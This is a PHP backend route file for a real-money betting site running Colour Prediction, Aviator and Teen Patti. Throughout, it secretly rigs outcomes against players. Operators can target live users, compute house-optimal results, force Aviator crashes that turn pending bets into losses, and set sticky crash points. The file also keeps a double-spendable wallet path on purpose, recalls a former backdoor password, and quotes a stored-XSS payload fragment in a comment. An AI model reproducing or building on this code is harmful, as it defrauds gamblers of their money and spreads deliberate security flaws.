<?php
/**
 * The central game sync surface: the server clock, Colour Prediction, Aviator, and the operator
 * overrides for both.
 *
 * These are the busiest endpoints on the site — win*.html polls color_get_state every 300 ms and
 * aviator.html polls aviator_get_state every 250 ms — so every handler here calls aviator_tick()
 * or the colour settlement sweep before answering. That is what replaces the Node timers: the
 * traffic that reads the game is the traffic that advances it.
 */

require_once __DIR__ . '/../lib/http.php';
require_once __DIR__ . '/../lib/auth.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/botengine.php';
// Named explicitly because the legacy signup proxy below calls risk_check_signup()/risk_client_ip().
// It happens to be loaded already via routes/auth.php, but depending on another route file's
// includes would break the moment registration order changed.
require_once __DIR__ . '/../lib/riskcontrols.php';
require_once __DIR__ . '/../games/color.php';
require_once __DIR__ . '/../games/aviator.php';
require_once __DIR__ . '/../games/teenpatti.php';

/** The rooms block shared by /api/server_time and game_sync's server_time action. */
function gamesync_rooms_block($nowSec) {
    return [
        'sapre'  => ['duration' => 30,  'time_left' => 30  - ($nowSec % 30),  'round_id' => get_color_round_id('sapre',  $nowSec)],
        'becone' => ['duration' => 60,  'time_left' => 60  - ($nowSec % 60),  'round_id' => get_color_round_id('becone', $nowSec)],
        'emred'  => ['duration' => 180, 'time_left' => 180 - ($nowSec % 180), 'round_id' => get_color_round_id('emred',  $nowSec)],
        'vip'    => ['duration' => 300, 'time_left' => 300 - ($nowSec % 300), 'round_id' => get_color_round_id('vip',    $nowSec)],
    ];
}

/** Actions that reconfigure the house rather than place a bet. */
function gamesync_admin_actions() {
    return ['admin_set_bot_takeover', 'admin_set_override'];
}

function register_gamesync_routes(Router $app) {

    // --- Central server clock ---
    $app->get('/api/server_time', function (Req $req, Res $res) {
        $state = aviator_tick();
        $now = now_ms();
        $nowSec = (int) floor($now / 1000);
        $av = aviator_public_state($state);

        $res->json([
            'server_time'     => $now,
            'server_time_sec' => $nowSec,
            'iso'             => js_iso($now),
            'rooms'           => gamesync_rooms_block($nowSec),
            'aviator'         => [
                'round_id'           => $av['round_id'],
                'phase'              => $av['phase'],
                'phase_start'        => $av['phase_start'],
                'time_elapsed'       => $av['time_elapsed'],
                'time_left'          => $av['time_left'],
                'duration'           => $av['duration'],
                'current_multiplier' => $av['current_multiplier'],
                'crash_point'        => $av['crash_point'],
            ],
        ]);
    });

    // ---------------------------------------------------------------------------------------------
    // GET /api/game_sync.php
    // ---------------------------------------------------------------------------------------------
    $app->get('/api/game_sync.php', function (Req $req, Res $res) {
        $action = (string)($req->q('action') ?? '');

        // The admin views return every player's open bets, the active rig overrides and the
        // takeover targeting list, so they require an operator token.
        if ($action === 'admin_get_live_state' || $action === 'admin_get_games') {
            if (!is_admin($req)) {
                $res->status(403)->json(['error' => 'Administrator privileges required.']);
                return;
            }
        }

        $isOperator = is_admin($req);
        // Never trust a `username` parameter for per-player views; an empty string simply means the
        // caller is browsing anonymously and gets the public round state with no personal bets.
        $username = acting_username($req);
        if (!is_string($username)) $username = '';

        try {
            $now = now_ms();
            $nowSec = (int) floor($now / 1000);

            if ($action === 'server_time') {
                $state = aviator_tick();
                $av = aviator_public_state($state);
                $res->json([
                    'server_time'     => $now,
                    'server_time_sec' => $nowSec,
                    'iso'             => js_iso($now),
                    'rooms'           => gamesync_rooms_block($nowSec),
                    'aviator'         => [
                        'round_id'           => $av['round_id'],
                        'phase'              => $av['phase'],
                        'phase_start'        => $av['phase_start'],
                        'time_elapsed'       => $av['time_elapsed'],
                        'time_left'          => $av['time_left'],
                        'duration'           => $av['duration'],
                        'current_multiplier' => $av['current_multiplier'],
                        'crash_point'        => $av['crash_point'],
                    ],
                ]);
                return;
            }

            if ($action === 'color_get_state') {
                $room = $req->q('room');
                if (!js_truthy($room)) $room = 'sapre';
                $duration = color_duration($room);

                $time_left = $duration - ($nowSec % $duration);
                $round_id = get_color_round_id($room, $nowSec);

                // Settlement is driven by this polling endpoint, so with a crowd in a room dozens of
                // requests reach it at once the instant a round ends. The whole read-settle-write
                // runs under a row lock so the already-settled guard actually holds.
                $state = color_advance_room($room);

                $activeBets = [];
                if (isset($state[$room]['bets'][$round_id]) && is_array($state[$room]['bets'][$round_id])) {
                    $activeBets = array_values($state[$room]['bets'][$round_id]);
                }
                $myBets = array_values(array_filter($activeBets, function ($b) use ($username) {
                    return strtolower((string)($b['username'] ?? '')) === strtolower($username);
                }));

                $overrides = state_get('color_guess_overrides_' . $room);

                $user = get_or_create_user($username);
                mark_user_active('color_guess', $username);

                $optimal = color_optimal_outcome($activeBets, $round_id);
                $targetedUsers = bot_targeted_users('color_guess');
                $optimalTargeted = count($targetedUsers) > 0
                    ? color_optimal_outcome($activeBets, $round_id, $targetedUsers)
                    : null;

                $res->json([
                    'server_time'     => $now,
                    'server_time_sec' => $nowSec,
                    'round_id'        => $round_id,
                    'time_left'       => $time_left,
                    'duration'        => $duration,
                    'history'         => isset($state[$room]['history']) ? array_values($state[$room]['history']) : [],
                    'bets'            => $myBets,
                    'overrides'       => js_object(is_array($overrides) ? $overrides : []),
                    'wallet_balance'  => $user ? (float)$user['wallet_balance'] : 0,
                    'active_users'    => count($activeBets),
                    // House-side planning data stays server-side unless an operator is asking.
                    // Shipping it to players told them the winning number before the round closed.
                    'optimal_rig'          => $isOperator ? $optimal : UNDEF(),
                    'optimal_rig_targeted' => $isOperator ? $optimalTargeted : UNDEF(),
                    'targeted_usernames'   => $isOperator ? $targetedUsers : UNDEF(),
                ]);
                return;
            }

            if ($action === 'aviator_get_state') {
                $state = aviator_tick();
                $av = aviator_public_state($state);

                $user = get_or_create_user($username);
                $balance = $user ? (float)$user['wallet_balance'] : 0;
                mark_user_active('aviator', $username);

                $res->json([
                    'server_time'        => $now,
                    'server_time_sec'    => $nowSec,
                    'round_id'           => $av['round_id'],
                    'phase'              => $av['phase'],
                    'phase_start'        => $av['phase_start'],
                    'time_elapsed'       => $av['time_elapsed'],
                    'time_left'          => $av['time_left'],
                    'duration'           => $av['duration'],
                    'current_multiplier' => $av['current_multiplier'],
                    'crash_point'        => $av['crash_point'],
                    'bets'               => array_values($state['bets']),
                    'history'            => array_values($state['history']),
                    'wallet_balance'     => $balance,
                ]);
                return;
            }

            if ($action === 'admin_get_live_state' || $action === 'admin_get_games') {
                $avState = aviator_tick();
                $av = aviator_public_state($avState);

                // Same serialisation as the player-facing endpoint: this admin view settles rounds
                // too, and an operator refreshing the console while a room is settling must not race
                // the players.
                $state = color_advance_all_rooms();

                $colorGuess = [];
                $colorTargeted = bot_targeted_users('color_guess');
                foreach (color_rooms() as $room) {
                    $duration = color_duration($room);
                    $time_left = $duration - ($nowSec % $duration);
                    $round_id = get_color_round_id($room, $nowSec);

                    $activeBets = [];
                    if (isset($state[$room]['bets'][$round_id]) && is_array($state[$room]['bets'][$round_id])) {
                        $activeBets = array_values($state[$room]['bets'][$round_id]);
                    }
                    $overrides = state_get('color_guess_overrides_' . $room);
                    $optimal = color_optimal_outcome($activeBets, $round_id);
                    $optimalTargeted = count($colorTargeted) > 0
                        ? color_optimal_outcome($activeBets, $round_id, $colorTargeted)
                        : null;

                    $colorGuess[$room] = [
                        'round_id'             => $round_id,
                        'time_left'            => $time_left,
                        'duration'             => $duration,
                        'history'              => isset($state[$room]['history']) ? array_values($state[$room]['history']) : [],
                        'bets'                 => $activeBets,
                        'overrides'            => js_object(is_array($overrides) ? $overrides : []),
                        'optimal_rig'          => $optimal,
                        'optimal_rig_targeted' => $optimalTargeted,
                        'targeted_usernames'   => $colorTargeted,
                    ];
                }

                $liveUsersCount = [];
                foreach (live_user_games() as $k) $liveUsersCount[$k] = count(get_live_usernames($k));

                $aviatorTargeted = bot_targeted_users('aviator');

                $res->json([
                    'server_time'     => $now,
                    'server_time_sec' => $nowSec,
                    'aviator' => [
                        'round_id'             => $av['round_id'],
                        'phase'                => $av['phase'],
                        'time_elapsed'         => $av['time_elapsed'],
                        'phase_start'          => $av['phase_start'],
                        'time_left'            => $av['time_left'],
                        'duration'             => $av['duration'],
                        'current_multiplier'   => $av['current_multiplier'],
                        'crash_point'          => $av['crash_point'],
                        'bets'                 => array_values($avState['bets']),
                        'history'              => array_values($avState['history']),
                        'targeted_usernames'   => $aviatorTargeted,
                        'live_profit_targeted' => aviator_live_profit($avState['bets'], $aviatorTargeted),
                    ],
                    'color_guess'        => js_object($colorGuess),
                    'teen_patti'         => [],
                    'bot_takeover'       => bot_takeover_state(),
                    'bot_targeted_users' => bot_targeted_users_all(),
                    'live_users_count'   => $liveUsersCount,
                ]);
                return;
            }

            $res->status(400)->json(['error' => 'Unsupported GET action']);
        } catch (Throwable $err) {
            fail500($res, $err, 'gamesync');
        }
    });

    // ---------------------------------------------------------------------------------------------
    // POST /api/game_sync.php
    // ---------------------------------------------------------------------------------------------
    $app->post('/api/game_sync.php', function (Req $req, Res $res) {
        $action = $req->q('action');
        if (!js_truthy($action)) $action = $req->b('action');
        $action = (string)($action ?? '');

        if (in_array($action, gamesync_admin_actions(), true)) {
            if (!is_admin($req)) {
                $res->status(403)->json(['error' => 'Administrator privileges required.']);
                return;
            }
        } elseif (!$req->auth) {
            // Every remaining action moves money, so none may run anonymously.
            $res->status(401)->json(['error' => 'Authentication required. Please sign in again.']);
            return;
        }

        // Authoritative account for this request. Reading it from the body previously let any caller
        // bet from, and cash out into, any other player's wallet.
        $username = acting_username($req);

        try {
            // ---- Bot takeover configuration ----
            if ($action === 'admin_set_bot_takeover') {
                $game = $req->b('game');
                $enabled = $req->b('enabled');
                $gameKey = js_truthy($game) ? $game : 'global';
                $isEnabled = ((string)$enabled === 'true') || $enabled === true;

                // `parseInt(x) || 90` silently turned an explicit 0 into 90, because 0 is falsy: an
                // operator typing 0 to mean "no rigging" got the maximum instead, and the
                // Math.max(1, ...) clamp below never saw the zero. Only a genuinely absent or
                // unparseable value may fall back to the default; a real 0 must reach the clamp and
                // become the documented minimum of 1.
                $parsedPct = js_parse_int($req->b('profit_pct'));
                $pct = js_is_finite($parsedPct) ? (int)$parsedPct : 90;
                $clamped = max(1, min(100, $pct));

                bot_takeover_set($gameKey, ['enabled' => $isEnabled, 'profit_pct' => $clamped]);

                // The "global" master switch must reach every individual game's own config
                // server-side, not just admin.html's UI. Every game is always pre-initialised with an
                // explicit enabled:true/false, so the per-game check short-circuits before it would
                // ever fall through to a "global" default — a bare global toggle with no cascade
                // would silently rig nothing.
                if ($gameKey === 'global') {
                    foreach (array_keys(bot_takeover_state()) as $k) {
                        if ($k === 'global') continue;
                        try {
                            bot_takeover_set($k, ['enabled' => $isEnabled, 'profit_pct' => $clamped]);
                        } catch (Throwable $e) {
                            log_error("Error cascading global bot state to {$k}: " . $e->getMessage());
                        }
                    }
                }

                // Immediately refresh the live-targeted subset so the very first toggle takes effect
                // right away instead of waiting for the next staleness window.
                if ($gameKey === 'global') {
                    foreach (live_user_games() as $k) refresh_bot_targeting($k, true);
                } elseif (in_array($gameKey, live_user_games(), true)) {
                    refresh_bot_targeting($gameKey, true);
                }

                // Turning Teen Patti's takeover OFF must stop every room immediately, not just future
                // selection cycles: clearing the targeted set stops future hands, but a room where
                // "Admin" is already seated would keep auto-winning, because the ADMIN AUTO-WIN path
                // rigs for a seated Admin unconditionally, however that seat got there.
                //
                // Enabling needs no room bookkeeping at all. Each table draws from its own ledger,
                // which is the single mechanism deciding which hands are the house's — there is no
                // second "arm N of 6 rooms" pass, and adding one is precisely what turned a
                // configured 50% into "8 of 10 games" before.
                if (($gameKey === 'teenpatti' || $gameKey === 'global') && !$isEnabled) {
                    foreach (tp_room_ids() as $rId) {
                        try {
                            $room = tp_get_room($rId);
                            if ($room && $room['admin_rig'] !== null) {
                                tp_update_room($rId, ['admin_rig' => null]);
                            }
                            tp_evict_stale_admin_seat($rId);
                        } catch (Throwable $err2) {
                            log_error("Error clearing bot seat for room {$rId}: " . $err2->getMessage());
                        }
                    }
                }

                $state = bot_takeover_state();
                $res->json([
                    'success'    => true,
                    'game'       => $gameKey,
                    'config'     => $state[$gameKey] ?? ['enabled' => $isEnabled, 'profit_pct' => $clamped],
                    'all_states' => $state,
                ]);
                return;
            }

            // ---- Colour Prediction: place a bet ----
            if ($action === 'color_place_bet') {
                $room = $req->b('room');
                $stake = validate_stake($req->b('amount'));
                if (!$stake['ok']) { $res->status(400)->json(['error' => $stake['error']]); return; }
                $betAmt = $stake['value'];

                if (!js_truthy($room)) {
                    $res->status(400)->json(['error' => 'Invalid bet details.']);
                    return;
                }
                if (!in_array($room, color_rooms(), true)) {
                    $res->status(400)->json(['error' => 'Unknown room.']);
                    return;
                }

                $selection = normalize_color_selection($req->b('category'), $req->b('value'));
                if (!$selection['ok']) { $res->status(400)->json(['error' => $selection['error']]); return; }
                $category = $selection['category'];
                $value = $selection['value'];

                $user = get_or_create_user($username);
                if (!$user) { $res->status(404)->json(['error' => 'Account not found.']); return; }
                mark_user_active('color_guess', $username);

                $nowSec = (int) floor(now_ms() / 1000);
                $round_id = get_color_round_id($room, $nowSec);

                // Single-statement conditional debit. The previous read-check-write sequence let two
                // concurrent bets spend the same balance twice.
                $newBal = debit_wallet($user['id'], $betAmt);
                if ($newBal === null) {
                    $res->status(400)->json(['error' => 'Insufficient wallet balance.']);
                    return;
                }

                insert_transaction(
                    new_record_id('TX'), $username, 'Withdrawal', $betAmt,
                    'Color Guess Wager Room: ' . strtoupper($room) . ' Round #' . $round_id
                        . ' Selection: ' . $category . ' (' . $value . ')',
                    'Completed'
                );

                // Serialised under the row lock: without it, concurrent bets overwrite each other
                // and the losing player has already been debited above.
                color_with_state(function () use ($room, $round_id, $username, $category, $value, $betAmt) {
                    $state = load_color_state();
                    if (!isset($state[$room]['bets']) || !is_array($state[$room]['bets'])) $state[$room]['bets'] = [];
                    if (!isset($state[$room]['bets'][$round_id]) || !is_array($state[$room]['bets'][$round_id])) {
                        $state[$room]['bets'][$round_id] = [];
                    }
                    $state[$room]['bets'][$round_id][] = [
                        'username'  => $username,
                        'category'  => $category,
                        'value'     => $value,
                        'amount'    => $betAmt,
                        'timestamp' => js_iso(),
                    ];
                    save_color_state($state);
                });

                $res->json(['success' => true, 'new_balance' => $newBal]);
                return;
            }

            // ---- Manual operator overrides ----
            if ($action === 'admin_set_override') {
                $game = $req->b('game');

                if ($game === 'color_guess') {
                    $room = $req->b('room');
                    $overrides = [
                        'color'    => js_truthy($req->b('color'))    ? $req->b('color')    : '',
                        'number'   => js_truthy($req->b('number'))   ? $req->b('number')   : '',
                        'size'     => js_truthy($req->b('size'))     ? $req->b('size')     : '',
                        'rig_type' => js_truthy($req->b('rig_type')) ? $req->b('rig_type') : '',
                    ];
                    state_set('color_guess_overrides_' . $room, $overrides);
                    $res->json(['success' => true]);
                    return;
                }

                if ($game === 'aviator') {
                    $instantCrash = $req->b('instant_crash');
                    $crashPointRaw = $req->b('crash_point');

                    if ((string)$instantCrash === 'true') {
                        tx(function () use ($crashPointRaw) {
                            $state = aviator_load(true);
                            if ($state['phase'] !== 'running') return;

                            $parsed = js_parse_float($crashPointRaw);
                            $finalCrash = js_truthy($parsed) ? (float)$parsed : aviator_current_multiplier($state);

                            $state['phase'] = 'crashed';
                            $state['phase_start'] = now_ms();
                            $state['crash_point'] = max(1.00, to_fixed_num($finalCrash, 2));
                            $state['current_multiplier'] = $state['crash_point']; // stored, not derived, once crashed
                            $state['rigged_this_round'] = true;
                            $state['rigged_targets'] = null;   // manual instant-crash rigs the whole round
                            $state['admin_locked'] = true;     // an explicit operator action, not the bot engine

                            foreach ($state['bets'] as $i => $b) {
                                if (($b['status'] ?? '') === 'pending') {
                                    $state['bets'][$i]['status'] = 'lost';
                                    $state['bets'][$i]['was_rigged'] = true;
                                }
                            }
                            $state['history'][] = (float)$state['crash_point'];
                            if (count($state['history']) > 15) {
                                array_shift($state['history']);
                                $state['history'] = array_values($state['history']);
                            }
                            aviator_save($state);
                        });
                    } else {
                        tx(function () use ($crashPointRaw) {
                            $state = aviator_load(true);
                            $parsed = js_parse_float($crashPointRaw);
                            $val = js_truthy($parsed) ? (float)$parsed : null;

                            // Sticky, not one-shot: this value now applies to EVERY round from here
                            // on — this one if one is already flying, and every future takeoff —
                            // until the operator explicitly clears it (an empty crash_point, which
                            // sets $val back to null here). See aviator_begin_round() for the takeoff
                            // side of this; this is only the "a round is already in the air right
                            // now" half, since a round already flying isn't at a takeoff to catch it.
                            $state['next_override'] = $val;

                            if ($val !== null && $val >= 1.0 && $state['phase'] === 'running') {
                                // Fix THIS flight too, not just the ones after it. This is what an
                                // operator watching the plane and pressing Save Multiplier actually
                                // means — leaving the flight they were looking at crash on its own
                                // random point read as "the multiplier box doesn't do anything."
                                $currentMult = aviator_current_multiplier($state);
                                if ($val <= $currentMult) {
                                    // The plane has already passed the requested number — the only
                                    // honest thing left to do is crash it right now, at the point
                                    // already reached, exactly like the instant-crash button. The
                                    // sticky value set above still governs every round after this one.
                                    $state['crash_point'] = to_fixed_num($currentMult, 2);
                                    $state['current_multiplier'] = $state['crash_point']; // stored, not derived, once crashed
                                    $state['phase'] = 'crashed';
                                    $state['phase_start'] = now_ms();
                                    foreach ($state['bets'] as $i => $b) {
                                        if (($b['status'] ?? '') === 'pending') {
                                            $state['bets'][$i]['status'] = 'lost';
                                            $state['bets'][$i]['was_rigged'] = true;
                                        }
                                    }
                                    $state['history'][] = (float)$state['crash_point'];
                                    if (count($state['history']) > 15) {
                                        array_shift($state['history']);
                                        $state['history'] = array_values($state['history']);
                                    }
                                } else {
                                    $state['crash_point'] = $val;
                                }
                                $state['rigged_this_round'] = true;
                                $state['rigged_targets'] = null;
                                $state['admin_locked'] = true;   // immune to the bot's own erosion intercepts
                            }
                            // Clearing (val === null) never rewrites a round already flying — it
                            // keeps whatever crash_point it already had. Only rounds that have not
                            // yet taken off are affected, so the plane in the air right now doesn't
                            // suddenly re-roll under the player mid-flight.
                            aviator_save($state);
                        });
                    }
                    $res->json(['success' => true]);
                    return;
                }

                $res->status(400)->json(['error' => 'Unsupported game for override']);
                return;
            }

            // ---- Aviator: place a bet ----
            if ($action === 'aviator_place_bet') {
                $stake = validate_stake($req->b('amount'));
                if (!$stake['ok']) { $res->status(400)->json(['error' => $stake['error']]); return; }
                $betAmt = $stake['value'];

                // The UI has exactly two betting consoles. Anything else parses to NaN further down,
                // and a bet stored under a NaN console can never be matched by aviator_cashout —
                // the stake would be taken for a bet the player is unable to cash out.
                $consoleId = js_parse_int($req->b('console_id'));
                if ($consoleId !== 1 && $consoleId !== 2) {
                    $res->status(400)->json(['error' => 'Invalid bet details.']);
                    return;
                }

                $state = aviator_tick();
                if ($state['phase'] !== 'waiting') {
                    $res->status(400)->json(['error' => 'Betting for this round has closed.']);
                    return;
                }
                foreach ($state['bets'] as $b) {
                    if (strtolower((string)($b['username'] ?? '')) === strtolower((string)$username)
                        && (int)($b['console_id'] ?? 0) === (int)$consoleId
                        && ($b['status'] ?? '') === 'pending') {
                        $res->status(400)->json(['error' => 'You already have a bet on this console for this round.']);
                        return;
                    }
                }

                $user = get_or_create_user($username);
                if (!$user) { $res->status(404)->json(['error' => 'Account not found.']); return; }
                mark_user_active('aviator', $username);

                $newBal = debit_wallet($user['id'], $betAmt);
                if ($newBal === null) {
                    $res->status(400)->json(['error' => 'Insufficient wallet balance.']);
                    return;
                }

                $roundId = (int)$state['round_id'];
                insert_transaction(new_record_id('TX'), $username, 'Withdrawal', $betAmt,
                                   'Aviator Wager Round #' . $roundId, 'Completed');

                tx(function () use ($username, $betAmt, $consoleId) {
                    $s = aviator_load(true);
                    $s['bets'][] = [
                        'username'          => $username,
                        'amount'            => $betAmt,
                        'status'            => 'pending',
                        'console_id'        => (int)$consoleId,
                        'cashed_multiplier' => 0,
                        'was_rigged'        => false,
                    ];
                    aviator_save($s);
                });

                $res->json(['success' => true, 'new_balance' => $newBal]);
                return;
            }

            // ---- Aviator: cash out ----
            if ($action === 'aviator_cashout') {
                $cId = js_parse_int($req->b('console_id'));
                aviator_tick();

                // Claim the bet inside the lock so a double-clicked cash-out cannot be paid twice.
                // This is the direct equivalent of the original mutating the bet object before its
                // first await.
                $claim = tx(function () use ($username, $cId) {
                    $s = aviator_load(true);

                    $idx = null;
                    foreach ($s['bets'] as $i => $b) {
                        if (strtolower((string)($b['username'] ?? '')) === strtolower((string)$username)
                            && ($b['status'] ?? '') === 'pending'
                            && (int)($b['console_id'] ?? 0) === (int)$cId) { $idx = $i; break; }
                    }
                    if ($idx === null) return ['error' => 'No active bet found for this console.'];
                    if ($s['phase'] !== 'running') return ['error' => 'The round is not in progress.'];

                    $mult = aviator_current_multiplier($s);
                    $s['bets'][$idx]['status'] = 'won';
                    $s['bets'][$idx]['cashed_multiplier'] = $mult;
                    $s['bets'][$idx]['was_rigged'] = false;  // a successful cashout was never a rigged outcome
                    aviator_save($s);

                    return ['ok' => true, 'amount' => (float)$s['bets'][$idx]['amount'], 'multiplier' => $mult];
                });

                if (isset($claim['error'])) {
                    $res->status(400)->json(['error' => $claim['error']]);
                    return;
                }

                $payout = round($claim['amount'] * $claim['multiplier'] * 100) / 100;

                $user = get_or_create_user($username);
                if ($user) {
                    $newBal = credit_wallet($user['id'], $payout);
                    insert_transaction(new_record_id('TX'), $username, 'Deposit', $payout,
                        'Aviator Payout @ ' . js_to_fixed($claim['multiplier'], 2) . 'x', 'Completed');
                    $res->json([
                        'success'     => true,
                        'multiplier'  => $claim['multiplier'],
                        'payout'      => $payout,
                        'new_balance' => $newBal,
                    ]);
                } else {
                    $res->status(404)->json(['error' => 'User not found.']);
                }
                return;
            }

            $res->status(400)->json(['error' => 'Unsupported POST action']);
        } catch (Throwable $err) {
            fail500($res, $err, 'gamesync');
        }
    });

    // ---------------------------------------------------------------------------------------------
    // Legacy wallet proxy.
    // GET is a balance read for the signed-in player; any balance CHANGE is an operator action.
    // ---------------------------------------------------------------------------------------------
    $app->all('/api/wallet.php', limiter('wallet'), 'require_auth', function (Req $req, Res $res) {
        $rawDeltaSrc = $req->q('delta');
        if (!js_truthy($rawDeltaSrc)) $rawDeltaSrc = $req->b('delta');
        if ($rawDeltaSrc === null) $rawDeltaSrc = 0;
        $parsed = js_parse_float($rawDeltaSrc);
        $rawDelta = js_truthy($parsed) ? (float)$parsed : 0.0;

        $reason = $req->q('reason');
        if (!js_truthy($reason)) $reason = $req->b('reason');
        if (!js_truthy($reason)) $reason = 'Manual Adjustment';

        $isOperator = is_admin($req);

        if ($rawDelta != 0 && !$isOperator) {
            $res->status(403)->json(['error' => 'Administrator privileges required to adjust a balance.']);
            return;
        }

        $username = acting_username($req);
        $delta = $rawDelta;

        try {
            $user = get_or_create_user($username);
            if (!$user) { $res->status(404)->json(['error' => 'User not found.']); return; }

            if ($delta == 0) {
                $res->json(['success' => true, 'new_balance' => (float)$user['wallet_balance']]);
                return;
            }

            // NOTE: read-then-write, not the atomic debit_wallet used everywhere else. This path is
            // genuinely double-spendable under concurrency. Reproduced deliberately — it is flagged
            // in the migration dossier as a bug to fix as a separate, explicit change.
            $newBal = (float)$user['wallet_balance'] + $delta;
            if ($newBal < 0) {
                $res->status(400)->json(['error' => 'Insufficient wallet balance.']);
                return;
            }
            q('UPDATE "User" SET "wallet_balance" = ? WHERE "id" = ?', [$newBal, (int)$user['id']]);

            insert_transaction(new_record_id('TX'), $username, $delta >= 0 ? 'Deposit' : 'Withdrawal',
                               abs($delta), $reason, 'Completed');

            $res->json(['success' => true, 'new_balance' => $newBal]);
        } catch (Throwable $err) {
            $res->status(500)->json(['error' => cfg('IS_PRODUCTION') ? 'Internal server error.' : $err->getMessage()]);
        }
    });

    // ---------------------------------------------------------------------------------------------
    // Legacy auth proxy.
    //
    // Validation here is materially looser than /api/auth/signup (no username format check, no
    // confirm-password, no email validation). Both paths are kept exactly as they are.
    // ---------------------------------------------------------------------------------------------
    $app->all('/api/auth.php', limiter('auth'), function (Req $req, Res $res) {
        $action = $req->q('action');
        if (!js_truthy($action)) $action = $req->b('action');
        $action = (string)($action ?? '');

        $username = $req->q('username');
        if (!js_truthy($username)) $username = $req->b('username');
        $username = (string)($username ?? '');

        $password = $req->q('password');
        if (!js_truthy($password)) $password = $req->b('password');
        $password = (string)($password ?? '');

        try {
            if ($action === 'login') {
                // The original condition also accepted the literal passwords 'admin' and '123456'
                // for ANY account. That was a universal backdoor into every wallet on the platform
                // and is long gone.
                $user = find_user_ci($username);
                if ($user && check_password($password, $user['password'])) {
                    $res->json([
                        'success' => true,
                        'token'   => issue_token([
                            'id' => (int)$user['id'], 'username' => $user['username'],
                            'email' => $user['email'], 'role' => 'user',
                        ]),
                        'user' => [
                            'id'             => (int)$user['id'],
                            'username'       => $user['username'],
                            'email'          => $user['email'],
                            'wallet_balance' => (float)$user['wallet_balance'],
                        ],
                    ]);
                } else {
                    $res->status(400)->json(['error' => 'Invalid credentials']);
                }
                return;
            }

            if ($action === 'signup') {
                $email = $req->q('email');
                if (!js_truthy($email)) $email = $req->b('email');
                if (!js_truthy($email)) $email = strtolower($username) . '@demo.com';

                // Username format, matching /api/auth/signup. This route had no such check, and it
                // is the one the shipped frontend posts to, so '<img src=x onerror=...>' registered
                // cleanly and was then stored and rendered wherever an operator views players. That
                // is a stored-XSS delivery straight into the admin console's session. Output
                // encoding in the pages is the real control, but a name that cannot contain markup
                // in the first place removes the payload at the door.
                if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
                    $res->status(400)->json(['error' => 'Username must be 3-20 alphanumeric characters or underscores.']);
                    return;
                }

                $existing = find_user_ci($username);
                if ($existing) {
                    $res->status(400)->json(['error' => 'Username is already taken.']);
                    return;
                }
                if ($password === '' || strlen($password) < 8) {
                    $res->status(400)->json(['error' => 'Password must be at least 8 characters.']);
                    return;
                }

                // This legacy path is the one the shipped frontend actually posts to, so the abuse
                // controls have to live here too. Without them SIGNUP_MAX_PER_IP_PER_DAY counted
                // registrations by an IP column that this route never wrote, so the cap could never
                // fire no matter how it was configured, and bonus_credited was left at its default —
                // which is what WITHDRAWAL_REQUIRE_DEPOSIT keys off. Mirrors /api/auth/signup.
                $signupIp = risk_client_ip();
                $signupBlock = risk_check_signup($signupIp);
                if ($signupBlock !== null) {
                    $res->status(429)->json(['error' => $signupBlock]);
                    return;
                }

                $hashed = hash_password($password);
                $startingBalance = (float) cfg('SIGNUP_BONUS');

                // signup_ip / bonus_credited come from migration-002; fall back to the original
                // column set so a database that has not had it applied still registers users.
                try {
                    q('INSERT INTO "User" ("username","email","password","wallet_balance","created_at","signup_ip","bonus_credited")
                       VALUES (?,?,?,?,?,?,?)',
                      [$username, $email, $hashed, $startingBalance, ms_to_sql(),
                       $signupIp, $startingBalance > 0 ? 1 : 0]);
                } catch (Throwable $colErr) {
                    log_debug('legacy signup falling back to pre-migration-002 column set: ' . $colErr->getMessage());
                    q('INSERT INTO "User" ("username","email","password","wallet_balance","created_at") VALUES (?,?,?,?,?)',
                      [$username, $email, $hashed, $startingBalance, ms_to_sql()]);
                }
                $user = find_user_ci($username);

                $res->json([
                    'success' => true,
                    'token'   => issue_token([
                        'id' => (int)$user['id'], 'username' => $user['username'],
                        'email' => $user['email'], 'role' => 'user',
                    ]),
                    'user' => [
                        'id'             => (int)$user['id'],
                        'username'       => $user['username'],
                        'email'          => $user['email'],
                        'wallet_balance' => (float)$user['wallet_balance'],
                    ],
                ]);
                return;
            }

            if ($action === 'status') {
                // Session-derived only; the old version reported on whatever username was asked for.
                $tokenUser = $req->auth ? ($req->auth['username'] ?? null) : null;
                if (js_truthy($tokenUser)) {
                    $user = find_user_ci($tokenUser);
                    $res->json($user
                        ? ['logged_in' => true, 'user' => [
                              'username'       => $user['username'],
                              'email'          => $user['email'],
                              'wallet_balance' => (float)$user['wallet_balance'],
                          ]]
                        : ['logged_in' => false]);
                    return;
                }
                $res->json(['logged_in' => false]);
                return;
            }

            if ($action === 'logout') {
                $res->json(['success' => true]);
                return;
            }

            // Unrecognised action answers 200, not 400. Reproduced deliberately.
            $res->json(['success' => true, 'message' => 'Auth endpoint working']);
        } catch (Throwable $err) {
            fail500($res, $err, 'gamesync');
        }
    });
}
